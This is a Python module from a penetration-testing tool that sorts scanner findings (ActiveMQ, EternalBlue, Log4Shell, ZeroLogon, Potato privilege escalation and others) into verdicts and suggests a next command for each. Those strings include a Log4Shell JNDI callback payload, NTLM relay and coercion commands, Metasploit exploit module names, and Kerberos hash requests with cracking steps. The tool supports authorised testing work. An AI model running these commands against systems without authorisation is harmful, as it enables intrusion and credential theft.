"""Proof-of-vulnerability engine: turn a flagged finding into a verdict.

Scanners flag a LOT (a dozen ActiveMQ / SMB / SeImpersonate items) and leave the
tester to decide which are real. This module reasons over the evidence recce
already collected - the exact version, the port state, the NSE detection result,
the on-target privilege state - and returns, per finding, one of:

    CONFIRMED       - the evidence positively proves it (a non-intrusive NSE
                      detection fired, signing really is off, the privilege really
                      is Enabled, we negotiated the weak protocol ourselves).
    FALSE POSITIVE  - the evidence disproves it (the build is patched, signing is
                      required, the NSE check says NOT VULNERABLE).
    LIKELY          - the preconditions hold but the final proof needs the PoC;
                      the exact safe command to finish proving is given.
    INCONCLUSIVE    - not enough collected yet; what to gather is given.

Every verdict carries the evidence it used, the preconditions, the EXACT next
command to finish proving (within ROE), and what a false positive would look
like. Nothing here exploits anything - it reasons and it tells you the safe check
to run.
"""

from __future__ import annotations

import re

from .models import Host, Port, Vuln
from .vulndb import _cmp                      # reuse the version comparator

CONFIRMED = "CONFIRMED"
LIKELY = "LIKELY"
FALSE_POSITIVE = "FALSE POSITIVE"
INCONCLUSIVE = "INCONCLUSIVE"


# --- evidence helpers -----------------------------------------------------------

def _port_of(host: Host, vuln: Vuln) -> Port | None:
    for p in host.open_ports:
        if p.portid == vuln.port:
            return p
    return None


def _pv(host: Host, vuln: Vuln) -> tuple[str, str]:
    p = _port_of(host, vuln)
    return ((p.product or ""), (p.version or "")) if p else ("", "")


def _port_open(host: Host, portid: int) -> bool:
    return any(p.portid == portid for p in host.open_ports)


def _nse_vulnerable(vuln: Vuln) -> bool | None:
    """True if a non-intrusive NSE detection positively fired, False if it
    explicitly says NOT VULNERABLE, None if the finding isn't an NSE result."""
    blob = f"{vuln.state} {vuln.output}".upper()
    if "NOT VULNERABLE" in blob:
        return False
    if vuln.source == "nse" and "VULNERABLE" in blob:
        return True
    if "VULNERABLE" in (vuln.state or "").upper():
        return True
    return None


def _local(host: Host, pattern: str) -> str | None:
    """Return the first on-target (deploy/ingest) finding text matching pattern."""
    rx = re.compile(pattern, re.I)
    for f in getattr(host, "local_findings", []) or []:
        t = f.get("vector", "")
        if rx.search(t):
            return t
    return None


def _os_blob(host: Host) -> str:
    return f"{host.os_name} {host.os_family}".lower()


def _is_dc(host: Host) -> bool:
    if any("domain controller" in r.lower() or "directory" in r.lower()
           for r in getattr(host, "roles", []) or []):
        return True
    return any(p.portid in {88, 389, 636, 3268, 3269, 464} for p in host.open_ports)


# --- per-type verdict functions -------------------------------------------------

def _v_activemq(host, port, vuln):
    prod, ver = _pv(host, vuln)
    if not ver:
        return INCONCLUSIVE, ["No ActiveMQ version was detected on the port. Collect it: "
                              "nmap -sV -p61616,8161 <ip> (the OpenWire banner carries the build)."]
    # Fixed releases per maintained branch (CVE-2023-46604).
    fixed = {"5.15": "5.15.16", "5.16": "5.16.7", "5.17": "5.17.6", "5.18": "5.18.3"}
    branch = ".".join(ver.split(".")[:2])
    fx = fixed.get(branch)
    if fx and _cmp(ver, fx) >= 0:
        return FALSE_POSITIVE, [f"ActiveMQ {ver} is >= the fixed {fx} for the {branch}.x line -> PATCHED.",
                                "CVE-2023-46604 does not apply to a patched build - dismiss."]
    ev = [f"ActiveMQ {ver} is below the fixed release for its branch -> version-vulnerable to CVE-2023-46604."]
    if _port_open(host, 61616):
        ev.append("OpenWire port 61616 is OPEN -> the RCE transport is reachable.")
        return LIKELY, ev
    ev.append("OpenWire 61616 was NOT seen open (only the 8161 web console?). The RCE rides OpenWire, "
              "so confirm 61616 is reachable before trusting this - it may be firewalled.")
    return LIKELY, ev


def _v_smb_signing(host, port, vuln):
    sig = (host.smb_signing or "").lower()
    if sig == "not required":
        return CONFIRMED, ["SMB signing is 'not required' on this host (directly observed via "
                           "smb2-security-mode) -> an NTLM relay TO this host will succeed.",
                           "This is a verified state, not a version guess."]
    if sig == "required":
        return FALSE_POSITIVE, ["SMB signing is REQUIRED on this host -> relay to it is blocked. "
                                "Dismiss any 'relay to this host' finding."]
    return INCONCLUSIVE, ["Signing state not captured. Confirm: nmap --script smb2-security-mode -p445 <ip> "
                          "(or: nxc smb <ip> --gen-relay-list relays.txt)."]


def _v_ms17(host, port, vuln):
    nse = _nse_vulnerable(vuln)
    if nse is True:
        return CONFIRMED, ["nmap smb-vuln-ms17-010 reports VULNERABLE - a non-intrusive detection that "
                           "does not exploit the host -> CONFIRMED. EternalBlue applies."]
    if nse is False:
        return FALSE_POSITIVE, ["The smb-vuln-ms17-010 NSE check reports NOT VULNERABLE (patched) -> dismiss."]
    return LIKELY, ["This was inferred from OS/version, not a positive NSE hit. Prove it non-intrusively: "
                    "nmap --script smb-vuln-ms17-010 -p445 <ip>  (VULNERABLE = real, NOT VULNERABLE = FP)."]


def _v_smbghost(host, port, vuln):
    osn = f"{host.os_name} {host.os_family}".lower()
    # CVE-2020-0796 affects Windows 10 / Server builds 1903 & 1909 only.
    if re.search(r"1903|1909|18362|18363", osn):
        return LIKELY, ["OS build is in the SMBGhost range (1903/1909) and SMBv3.1.1 compression is the "
                        "default -> plausible.", "Prove non-intrusively with the public detection checker "
                        "(ollypwn/SMBGhost_scanner) - it reads the compression capability, no exploit."]
    if re.search(r"windows (7|8|2008|2012|2016|2019|2022)|1809|17763|20348", osn):
        return FALSE_POSITIVE, [f"OS ({host.os_name or host.os_family}) is outside the 1903/1909 SMBGhost "
                                "window -> not affected. Dismiss."]
    return INCONCLUSIVE, ["Exact Windows build unknown. Collect it (systeminfo / on-target enum), then only "
                          "1903/1909 are affected."]


def _v_potato(host, port, vuln):
    held = _local(host, r"seimpersonate|seassignprimarytoken")
    if held and re.search(r"enabled", held, re.I):
        return CONFIRMED, [f"On-target enum confirms the privilege is ENABLED: {held}",
                           "GodPotato / PrintSpoofer / JuicyPotatoNG work on current patched Win10/11 & "
                           "Server 2016-2022 (they abuse SeImpersonate, not a patchable bug) -> real path to SYSTEM."]
    if held:
        return LIKELY, [f"The privilege is present but its enabled-state isn't confirmed: {held}",
                        "Confirm on-target: whoami /priv  -> SeImpersonatePrivilege must show 'Enabled'. "
                        "It's Enabled by default for service / IIS AppPool / MSSQL accounts."]
    # Only a remote inference (IIS/MSSQL likely holds it) - needs on-target proof.
    return INCONCLUSIVE, ["This is inferred remotely (a service that usually holds SeImpersonate). Prove it "
                          "on-target: get code exec as the service account, run  whoami /priv  and check "
                          "SeImpersonatePrivilege = Enabled. Use recce deploy/ingest to collect it."]


def _v_nullsession(host, port, vuln):
    if _nse_vulnerable(vuln) or re.search(r"logged in|shares|allows sessions", vuln.output or "", re.I):
        return CONFIRMED, ["The check actually established an anonymous/null session (it enumerated without "
                           "credentials) -> CONFIRMED."]
    return LIKELY, ["Prove directly: nxc smb <ip> -u '' -p '' --shares   (or enum4linux-ng -A <ip>). "
                    "If it lists shares/users without creds, it's real; access denied = FP."]


def _v_anon_ftp(host, port, vuln):
    if re.search(r"anonymous.*(allowed|permitted|succeeded|logged)|230 ", vuln.output or "", re.I):
        return CONFIRMED, ["Anonymous FTP login succeeded during the check -> CONFIRMED."]
    return LIKELY, ["Prove: ftp <ip>  then log in as 'anonymous' with a blank/any password. A 230 login = "
                    "real; 530 = FP."]


def _v_weak_tls(host, port, vuln):
    return CONFIRMED, ["recce negotiated the weak protocol/cipher itself during the TLS probe - this is a "
                       "direct observation, not a version inference, so it is real (a hardening issue, not "
                       "an RCE).", "Re-verify anytime: sslscan <ip>:<port>  or  openssl s_client -connect "
                       "<ip>:<port> -tls1 (a successful handshake confirms it)."]


def _v_printnightmare(host, port, vuln):
    if "windows" not in _os_blob(host) and host.os_family:
        return FALSE_POSITIVE, ["PrintNightmare is Windows-only; this host isn't Windows -> dismiss."]
    surface = _local(host, r"printnightmare surface|nowarningnoelevation")
    if surface:
        return LIKELY, [f"On-target enum confirms the LPE precondition: {surface}",
                        "Spooler is running and Point-and-Print allows non-admin driver installs -> the "
                        "CVE-2021-34527 surface is present. Exploitability is patch-dependent."]
    return INCONCLUSIVE, ["Flagged, but the Spooler state/config isn't confirmed on-target.",
                          "Confirm non-intrusively: rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR' (the print RPC "
                          "interface). Present + unpatched -> real; interface absent / Spooler disabled -> FP."]


def _v_bluekeep(host, port, vuln):
    osn = _os_blob(host)
    rdp = _port_open(host, 3389)
    newer = re.search(r"windows (8|8\.1|10|11)|server 20(12|16|19|22)|windows 20(12|16|19|22)", osn)
    older = re.search(r"windows (xp|vista|7)\b|server 200[38]|2008 r2|windows 200[38]", osn)
    if newer and not older:
        return FALSE_POSITIVE, [f"OS ({host.os_name or host.os_family}) is Windows 8 / Server 2012 or newer "
                                "-> not affected by BlueKeep (CVE-2019-0708). Dismiss."]
    if older:
        ev = ["OS is in the BlueKeep pre-auth RCE range (XP/2003/Vista/7/2008/2008R2)."]
        ev.append("RDP (3389) is open -> reachable." if rdp
                  else "RDP 3389 not seen open - confirm it's reachable first.")
        return LIKELY, ev
    return INCONCLUSIVE, ["Exact Windows version unknown; only XP/2003/Vista/7/2008(R2) are affected. "
                          "Collect it (nmap -O / smb-os-discovery)."]


def _v_heartbleed(host, port, vuln):
    nse = _nse_vulnerable(vuln)
    if nse is True:
        return CONFIRMED, ["nmap ssl-heartbleed reports VULNERABLE - a detection that reads a small leaked "
                           "chunk (non-destructive) -> CONFIRMED."]
    if nse is False:
        return FALSE_POSITIVE, ["The ssl-heartbleed check reports NOT VULNERABLE (patched OpenSSL) -> dismiss."]
    prod, ver = _pv(host, vuln)
    if ver and "openssl" in prod.lower() and _cmp(ver, "1.0.1") >= 0 and _cmp(ver, "1.0.1g") < 0:
        return LIKELY, [f"OpenSSL {ver} is in the Heartbleed range (1.0.1-1.0.1f)."]
    return LIKELY, ["Prove non-intrusively: nmap --script ssl-heartbleed -p<port> <ip> (VULNERABLE = real, "
                    "NOT VULNERABLE = FP)."]


def _v_log4shell(host, port, vuln):
    return LIKELY, ["Log4Shell can't be proven from a banner - it depends on the app's bundled log4j version.",
                    "Prove non-intrusively with an out-of-band callback: inject ${jndi:ldap://<your-listener>/x} "
                    "into every input (User-Agent, X-Forwarded-For, form fields, search boxes) and watch a DNS/"
                    "LDAP listener you control (interactsh / your own DNS). A callback = CONFIRMED.",
                    "It's just a DNS lookup - no exploitation. No callback from any input -> not vulnerable / "
                    "egress-filtered."]


def _v_zerologon(host, port, vuln):
    if not _is_dc(host):
        return FALSE_POSITIVE, ["ZeroLogon (CVE-2020-1472) only affects Domain Controllers; this host isn't a "
                                "DC (no AD/LDAP/Kerberos ports, no DC role) -> dismiss."]
    return LIKELY, ["Host is a Domain Controller -> in scope for ZeroLogon.",
                    "Prove with the DETECTION-ONLY checker (it stops before changing anything): "
                    "zerologon_tester.py <DC-netbios-name> <ip>.",
                    "WARNING: the full exploit resets the DC machine-account password and can break AD - "
                    "detection-only unless you have a password-restore plan and explicit ROE."]


def _v_kerberoast(host, port, vuln):
    return CONFIRMED, ["The account carrying an SPN exists (the AD query returned it) -> the roasting TARGET "
                       "is real and confirmed.",
                       "Requesting its service ticket is a normal, non-destructive Kerberos operation; whether "
                       "it cracks depends on the password strength.",
                       "Prove end-to-end: impacket-GetUserSPNs <dom>/<user>:<pw> -request (or Rubeus kerberoast) "
                       "-> hashcat -m 13100 <hashes> <wordlist>."]


def _v_asrep(host, port, vuln):
    return CONFIRMED, ["The account has Kerberos pre-auth disabled (the AD query returned it) -> AS-REP "
                       "roastable, confirmed.",
                       "Requesting the AS-REP needs no credentials and is non-destructive.",
                       "Prove: impacket-GetNPUsers <dom>/ -usersfile <users> -no-pass -> hashcat -m 18200."]


def _v_default_creds(host, port, vuln):
    return LIKELY, ["Default/weak credentials are only proven by trying them (mind account-lockout policy so "
                    "you don't lock the account).",
                    "Prove: nxc <proto> <ip> -u <default-user> -p <default-pass> (or the product's documented "
                    "default login). A successful auth = CONFIRMED; failures across the known defaults = FP."]


# --- recipe registry ------------------------------------------------------------
# match: regex over (title + script_id + CVEs + output). fn: the verdict function.

_RECIPES: list[dict] = [
    {"id": "activemq-cve-2023-46604", "match": r"activemq|cve-2023-46604",
     "name": "Apache ActiveMQ OpenWire RCE (CVE-2023-46604)",
     "pre": ["OpenWire transport (tcp/61616) reachable", "ActiveMQ < 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3"],
     "finish": "msf: exploit/multi/misc/apache_activemq_rce_cve_2023_46604 (set RHOSTS/RPORT 61616, "
               "a check-only run first), or the public X1r0z/ActiveMQ-RCE PoC - within ROE.",
     "fp": "A patched build (>= the branch fix), or only the 8161 web console open while 61616 is firewalled.",
     "fn": _v_activemq},
    {"id": "smb-signing-relay", "match": r"signing not required|smb.?security.?mode|smb2?-security|message signing",
     "name": "SMB signing not required (NTLM relay)",
     "pre": ["SMB (445) reachable", "Message signing not required on the target"],
     "finish": "ntlmrelayx.py -t smb://<ip> -smb2support  then coerce auth (PetitPotam / printerbug) from a "
               "victim - lab/ROE. Quick confirm: nxc smb <ip> --gen-relay-list relays.txt.",
     "fp": "Signing REQUIRED (DCs require it by default) -> relay blocked.",
     "fn": _v_smb_signing},
    {"id": "ms17-010", "match": r"ms17-010|eternalblue|cve-2017-0143|cve-2017-0144",
     "name": "MS17-010 EternalBlue (SMBv1 RCE)",
     "pre": ["SMBv1 (445) reachable", "Host missing MS17-010"],
     "finish": "nmap --script smb-vuln-ms17-010 -p445 <ip> (non-intrusive) to prove; then AutoBlue-MS17-010 "
               "or msf exploit/windows/smb/ms17_010_eternalblue in ROE.",
     "fp": "The NSE check reports NOT VULNERABLE (patched), or SMBv1 is disabled.",
     "fn": _v_ms17},
    {"id": "smbghost-cve-2020-0796", "match": r"smbghost|cve-2020-0796|coronablue",
     "name": "SMBGhost SMBv3 compression RCE (CVE-2020-0796)",
     "pre": ["Windows 10 / Server build 1903 or 1909", "SMBv3.1.1 with compression"],
     "finish": "public detection checker (ollypwn SMBGhost_scanner) to confirm the compression capability; "
               "PoC only in a lab (it bugchecks).",
     "fp": "Any build other than 1903/1909 -> not affected.",
     "fn": _v_smbghost},
    {"id": "seimpersonate-potato", "match": r"seimpersonate|seassignprimarytoken|godpotato|printspoofer|"
                                            r"juicypotato|potato|roguepotato|efspotato",
     "name": "SeImpersonate -> SYSTEM (Potato family)",
     "pre": ["Code exec as an account that HOLDS SeImpersonate/SeAssignPrimaryToken (Enabled)",
             "A supported Windows build (all current builds are supported by GodPotato)"],
     "finish": "on-target: GodPotato -cmd \"cmd /c whoami\"  (expect: nt authority\\system) - within ROE.",
     "fp": "The privilege is present but DISABLED, or you don't actually have code exec in that token yet.",
     "fn": _v_potato},
    {"id": "smb-null-session", "match": r"null session|anonymous.*smb|smb.*anonymous|guest.*access|"
                                        r"smb-enum-shares",
     "name": "SMB null / anonymous session",
     "pre": ["SMB (445/139) reachable", "Anonymous or guest access permitted"],
     "finish": "nxc smb <ip> -u '' -p '' --shares  (or enum4linux-ng -A <ip>).",
     "fp": "Access denied without credentials -> FP.",
     "fn": _v_nullsession},
    {"id": "anon-ftp", "match": r"anonymous ftp|ftp.*anonymous|anonymous login",
     "name": "Anonymous FTP login",
     "pre": ["FTP (21) reachable", "Anonymous login permitted"],
     "finish": "ftp <ip> -> user 'anonymous', blank password (expect a 230 response).",
     "fp": "A 530 login-incorrect response -> FP.",
     "fn": _v_anon_ftp},
    {"id": "weak-tls", "match": r"weak (ssl|tls|cipher)|sslv[23]|tls ?1\.0|tls ?1\.1|poodle|beast|"
                                r"deprecated tls|rc4|null cipher|export cipher",
     "name": "Weak SSL/TLS protocol or cipher",
     "pre": ["The service negotiates a deprecated protocol/cipher"],
     "finish": "sslscan <ip>:<port>  or  openssl s_client -connect <ip>:<port> -tls1  (a successful "
               "handshake on the weak protocol confirms it).",
     "fp": "Rarely a FP - it is a direct observation. Judge business impact, not existence.",
     "fn": _v_weak_tls},
    {"id": "printnightmare", "match": r"printnightmare|cve-2021-34527|cve-2021-1675|spooler.*rce|"
                                      r"rpcaddprinterdriver",
     "name": "PrintNightmare (CVE-2021-34527 / 1675, Print Spooler)",
     "pre": ["Print Spooler service running", "Point-and-Print allows non-admin driver install "
             "(NoWarningNoElevationOnInstall=1) OR the host is unpatched"],
     "finish": "rpcdump.py @<ip> | egrep 'MS-RPRN|MS-PAR' to confirm the interface; then the public PoC "
               "(cube0x0 CVE-2021-1675.py for RCE via a share, or Benjamin Delpy's for the LPE) - in ROE.",
     "fp": "Spooler disabled/stopped, or fully patched (Aug-2021+ with Point-and-Print locked down), or "
           "not a Windows host.",
     "fn": _v_printnightmare},
    {"id": "bluekeep", "match": r"bluekeep|cve-2019-0708|rdp.*(pre-?auth|remote code)",
     "name": "BlueKeep RDP pre-auth RCE (CVE-2019-0708)",
     "pre": ["RDP (3389) reachable", "OS is XP/2003/Vista/7/2008/2008R2"],
     "finish": "rdpscan <ip> (safe check mode) or msf auxiliary/scanner/rdp/cve_2019_0708_bluekeep (CHECK) "
               "to confirm; the exploit can bugcheck the host -> lab / ROE with a restore plan.",
     "fp": "Windows 8 / Server 2012 or newer (not affected), or RDP not reachable.",
     "fn": _v_bluekeep},
    {"id": "heartbleed", "match": r"heartbleed|cve-2014-0160|ssl-heartbleed",
     "name": "Heartbleed OpenSSL memory disclosure (CVE-2014-0160)",
     "pre": ["TLS service using OpenSSL 1.0.1 - 1.0.1f"],
     "finish": "nmap --script ssl-heartbleed -p<port> <ip> (non-intrusive; VULNERABLE = real). It leaks a "
               "small memory chunk - safe to run, and the leaked bytes are the proof.",
     "fp": "The NSE check says NOT VULNERABLE (patched OpenSSL, or not OpenSSL).",
     "fn": _v_heartbleed},
    {"id": "log4shell", "match": r"log4shell|log4j|cve-2021-44228|cve-2021-45046|jndi",
     "name": "Log4Shell JNDI RCE (CVE-2021-44228)",
     "pre": ["A Java app that logs attacker-controlled input via a vulnerable log4j (2.0-2.14.1)"],
     "finish": "inject ${jndi:ldap://<your-oob-listener>/x} into every input and watch a DNS/LDAP listener "
               "you own (interactsh) for a callback; then the public PoC to escalate a confirmed hit - in ROE.",
     "fp": "No OOB callback from any injection point -> not vulnerable or egress-filtered.",
     "fn": _v_log4shell},
    {"id": "zerologon", "match": r"zerologon|cve-2020-1472|netlogon.*(privilege|elevation)",
     "name": "ZeroLogon Netlogon privilege escalation (CVE-2020-1472)",
     "pre": ["Target is a Domain Controller", "DC unpatched (pre Aug-2020)"],
     "finish": "zerologon_tester.py <DC-netbios-name> <ip> (DETECTION-only - it stops before changing "
               "anything). Full PoC resets the machine-account password: lab / ROE with a restore plan only.",
     "fp": "Not a Domain Controller, or the DC is patched.",
     "fn": _v_zerologon},
    {"id": "kerberoast", "match": r"kerberoast",
     "name": "Kerberoastable service account (SPN)",
     "pre": ["A domain account with a servicePrincipalName", "Any valid domain credential to request the TGS"],
     "finish": "impacket-GetUserSPNs <dom>/<user>:<pass> -request  ->  hashcat -m 13100.",
     "fp": "Existence is confirmed by the query; the only question is whether the ticket cracks "
           "(strong / gMSA passwords won't).",
     "fn": _v_kerberoast},
    {"id": "asrep", "match": r"as-?rep roast",
     "name": "AS-REP roastable account (no pre-auth)",
     "pre": ["A domain account with Kerberos pre-authentication disabled"],
     "finish": "impacket-GetNPUsers <dom>/ -usersfile <users> -no-pass  ->  hashcat -m 18200.",
     "fp": "Existence is confirmed by the query; the only question is whether the hash cracks.",
     "fn": _v_asrep},
    {"id": "default-creds", "match": r"default (credential|password|login)|weak credential|"
                                     r"default (user|account)",
     "name": "Default / weak credentials",
     "pre": ["A service reachable with a known default or weak credential"],
     "finish": "nxc <proto> <ip> -u <default-user> -p <default-pass> (respect account-lockout), or the "
               "product's documented default login.",
     "fp": "The known defaults all fail to authenticate.",
     "fn": _v_default_creds},
]
_COMPILED = [(re.compile(r["match"], re.I), r) for r in _RECIPES]


def _blob(vuln: Vuln) -> str:
    return " ".join([vuln.title or "", vuln.script_id or "",
                     " ".join(vuln.ids or []), vuln.output or ""]).lower()


def recipe_for(vuln: Vuln) -> dict | None:
    b = _blob(vuln)
    for rx, r in _COMPILED:
        if rx.search(b):
            return r
    return None


def _synthetic(ip: str, text: str, source: str) -> Vuln:
    """A minimal Vuln wrapper so a recipe can run over an exploit/local-finding
    that isn't itself a Vulnerabilities-sheet row."""
    return Vuln(ip=ip, port=None, protocol="tcp", script_id=source, title=text,
                output=text, source=source)


def verify_host(host: Host) -> list[dict]:
    """Every proof-able finding on a host -> a verdict record. Scans the
    Vulnerabilities, on-target local findings and mapped exploits, deduped by
    (recipe, port)."""
    out: list[dict] = []
    seen: set[tuple] = set()

    def emit(vuln: Vuln):
        r = recipe_for(vuln)
        if not r:
            return
        key = (r["id"], vuln.port)
        if key in seen:
            return
        seen.add(key)
        port = _port_of(host, vuln)
        verdict, evidence = r["fn"](host, port, vuln)
        out.append({
            "ip": host.ip, "port": vuln.port, "vuln": r["name"],
            "finding": vuln.title or vuln.script_id or r["name"],
            "verdict": verdict, "evidence": evidence,
            "preconditions": r["pre"], "finish": r["finish"], "fp": r["fp"],
            "key": f"verify:{host.ip}:{vuln.port or 0}:{r['id']}"})

    for v in host.vulns:
        emit(v)
    for f in getattr(host, "local_findings", []) or []:
        emit(_synthetic(host.ip, f.get("vector", ""), "local"))
    for e in getattr(host, "exploits", []) or []:
        emit(_synthetic(host.ip, f"{e.title} {e.product}", "exploit"))
    # Verdict order: real first, noise last.
    order = {CONFIRMED: 0, LIKELY: 1, INCONCLUSIVE: 2, FALSE_POSITIVE: 3}
    out.sort(key=lambda r: order.get(r["verdict"], 9))
    return out


def verify_hosts(hosts: list[Host]) -> list[dict]:
    out: list[dict] = []
    for h in hosts:
        out.extend(verify_host(h))
    return out


def summary(results: list[dict]) -> dict[str, int]:
    counts = {CONFIRMED: 0, LIKELY: 0, INCONCLUSIVE: 0, FALSE_POSITIVE: 0}
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    return counts
